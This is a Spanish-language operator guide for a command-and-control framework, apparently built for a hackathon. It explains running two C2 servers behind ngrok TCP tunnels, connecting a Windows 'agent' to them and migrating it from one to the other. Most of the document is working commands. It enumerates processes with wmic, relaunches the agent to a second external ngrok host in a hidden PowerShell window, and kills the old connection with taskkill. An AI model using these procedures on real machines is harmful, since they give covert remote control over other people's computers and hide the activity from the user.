# 🎯 GUÍA: Ejecutar Dos Servidores Simultáneos

## ✅ Cambios Implementados

1. **Puerto configurable**: El servidor ahora acepta la variable de entorno `PORT`
2. **Auto-selección @agent**: Si solo hay un agente conectado, puedes usar `use @agent <comando>` en lugar de `use agent-XXXXX <comando>`

---

## 📋 Configuración de Dos Servidores

### Escenario
- **Computador A** (tu computador): Ejecuta Servidor A en puerto 4444
- **Computador B** (el mismo u otro): Ejecuta Servidor B en puerto 5555
- **Agente (Computador C - Oscar)**: Se conectará a uno u otro servidor

### Tienes 2 opciones:

---

## OPCIÓN 1: Dos servidores en TU MISMO computador

### Paso 1: Preparar dos tunnels de ngrok

**Terminal 1** (Cuenta ngrok #1):
```bash
ngrok tcp 4444
```
Resultado ejemplo:
```
Forwarding: tcp://4.tcp.ngrok.io:22961 -> localhost:4444
```

**Terminal 2** (Cuenta ngrok #2):
```bash
ngrok tcp 5555
```
Resultado ejemplo:
```
Forwarding: tcp://6.tcp.ngrok.io:25027 -> localhost:5555
```

### Paso 2: Ejecutar dos servidores

**Terminal 3** (Servidor A - Puerto 4444):
```bash
cd /home/jose/ArchivoPortable/Hackatonn/aligo-c2-framework/server
python3 server.py
# O explícitamente:
PORT=4444 python3 server.py
```

**Terminal 4** (Servidor B - Puerto 5555):
```bash
cd /home/jose/ArchivoPortable/Hackatonn/aligo-c2-framework/server
PORT=5555 python3 server.py
```

### Paso 3: Conectar agente a Servidor A
Desde el computador del agente (Oscar - Windows):
```cmd
python agent_ngrok.py 4.tcp.ngrok.io 22961
```

### Paso 4: Verificar conexión
En **Terminal 3** (Servidor A):
```
> list
 - agent-XXXXXX
```

---

## OPCIÓN 2: Un servidor en cada computador (A y B)

### En Computador A (tu computador)

**Terminal 1** - ngrok:
```bash
ngrok tcp 4444
```
Anota la dirección: `tcp://4.tcp.ngrok.io:22961`

**Terminal 2** - Servidor A:
```bash
cd /home/jose/ArchivoPortable/Hackatonn/aligo-c2-framework/server
python3 server.py
```

### En Computador B (els4nchez)

**Terminal 1** - ngrok (usar segunda cuenta):
```bash
ngrok tcp 4444
```
Anota la dirección: `tcp://6.tcp.ngrok.io:25027`

**Terminal 2** - Servidor B:
```bash
cd ~/Music/aligo-c2-frameworkk/server
python3 server.py
```

### Conectar agente
Desde computador del agente (Oscar):
```cmd
python agent_ngrok.py 4.tcp.ngrok.io 22961
```

---

## 🚀 PRUEBA: Migrar Agente de Servidor A → Servidor B

### Situación Inicial
- ✅ Agente conectado a Servidor A
- ✅ Servidor B esperando conexiones
- 🎯 Objetivo: Migrar el agente remotamente

### PROCESO COMPLETO (4 PASOS)

#### Paso 0: Información necesaria
Necesitas:
- **HOST_B**: La dirección ngrok del Servidor B (ej: `6.tcp.ngrok.io`)
- **PUERTO_B**: El puerto ngrok del Servidor B (ej: `25027`)

#### Paso 1: Obtener ruta actual del agente
Desde **Servidor A**:
```
> use @agent cd
```

Resultado esperado:
```
C:\Users\oscar\Documents\aligo-c2-framework\agent
```

Guarda esta ruta: **[RUTA]**

#### Paso 2: Obtener PID del proceso actual
Desde **Servidor A**:
```
> use @agent wmic process where "name='python.exe'" get ProcessId,CommandLine | findstr agent_ngrok.py
```

Resultado esperado:
```
C:\Users\oscar\AppData\Local\Programs\Python\Python313\python.exe agent_ngrok.py 4.tcp.ngrok.io 22961  3420
```

El último número es el PID: **3420** (guárdalo como **[PID]**)

#### Paso 3: Lanzar nueva conexión a Servidor B
Desde **Servidor A**, ejecuta (reemplaza valores):
```
> use @agent powershell -Command "Set-Location C:\Users\oscar\Documents\aligo-c2-framework\agent; Start-Process python -ArgumentList 'agent_ngrok.py','6.tcp.ngrok.io','25027' -WindowStyle Hidden"
```

**Valores a reemplazar:**
- `C:\Users\oscar\Documents\aligo-c2-framework\agent` ← Ruta del Paso 1
- `6.tcp.ngrok.io` ← HOST_B (ngrok de Servidor B)
- `25027` ← PUERTO_B (puerto ngrok de Servidor B)

#### Paso 4: Matar conexión con Servidor A (con delay)
Desde **Servidor A**, ejecuta (reemplaza PID):
```
> use @agent cmd /c "timeout /t 5 & taskkill /F /PID 3420"
```

**Valores a reemplazar:**
- `3420` ← PID del Paso 2

### Resultado Esperado

**En Terminal del Servidor A:**
```
[enviado] id=XXXXXX -> agent-YYYYYY: cmd /c "timeout /t 5 & taskkill /F /PID 3420"
[resultado de agent-YYYYYY] (id=XXXXXX):
Esperando durante 5 segundos, presione una tecla para continuar ...
[-] Agente desconectado: agent-YYYYYY
```

**En Terminal del Servidor B:**
```
[+] Agente conectado: agent-ZZZZZZ desde ('127.0.0.1', XXXXX) (Alex2cnon3)
```

¡Migración exitosa! 🎉

---

## 🔧 Uso del comando @agent

### Antes (tedioso)
```
> list
 - agent-a1b2c3
> use agent-a1b2c3 whoami
```

### Ahora (si solo hay UN agente)
```
> use @agent whoami
[auto-seleccionado] agent-a1b2c3
[enviado] id=XXXX -> agent-a1b2c3: whoami
```

### Si hay múltiples agentes
```
> use @agent whoami
Error: Hay 2 agentes conectados. Especifica uno:
 - agent-a1b2c3
 - agent-d4e5f6
```

---

## ❓ Troubleshooting

### El agente no aparece en Servidor B
1. Verifica que ngrok del Servidor B esté activo: `http://127.0.0.1:4040`
2. Revisa que usaste el HOST y PUERTO correctos en el Paso 3
3. Verifica en el dashboard de ngrok si hay conexiones: `Connections > ttl / opn`

### El Paso 4 no mata la conexión
- El delay de 5 segundos es CRÍTICO
- Permite que el comando responda antes de que el proceso muera
- Si falla, aumenta el timeout: `timeout /t 10`

### "Agente 'agent' no encontrado"
Escribiste mal el comando. Es `@agent` no `agent`:
```
❌ use agent whoami
✅ use @agent whoami
```

### No puedo ejecutar dos servidores en el mismo puerto
Correcto. Debes usar puertos diferentes:
- Servidor A: puerto 4444
- Servidor B: puerto 5555

---

## 📝 Comandos Rápidos de Referencia

### Ejecutar servidor con puerto personalizado
```bash
PORT=4444 python3 server.py  # Servidor A
PORT=5555 python3 server.py  # Servidor B
```

### Usar @agent (auto-selección)
```
> use @agent <comando>
```

### Migración rápida (template)
```bash
# Paso 1: Obtener ruta
use @agent cd

# Paso 2: Obtener PID
use @agent wmic process where "name='python.exe'" get ProcessId,CommandLine | findstr agent_ngrok.py

# Paso 3: Conectar a B
use @agent powershell -Command "Set-Location [RUTA]; Start-Process python -ArgumentList 'agent_ngrok.py','[HOST_B]','[PUERTO_B]' -WindowStyle Hidden"

# Paso 4: Matar A (esperar 5s)
use @agent cmd /c "timeout /t 5 & taskkill /F /PID [PID]"
```

---

## ✨ Próximos Pasos

1. ✅ Probar ejecución de dos servidores
2. ✅ Probar comando @agent
3. ✅ Probar migración completa A → B
4. 📝 Documentar para el equipo
5. 🎯 Demo en el hackathon

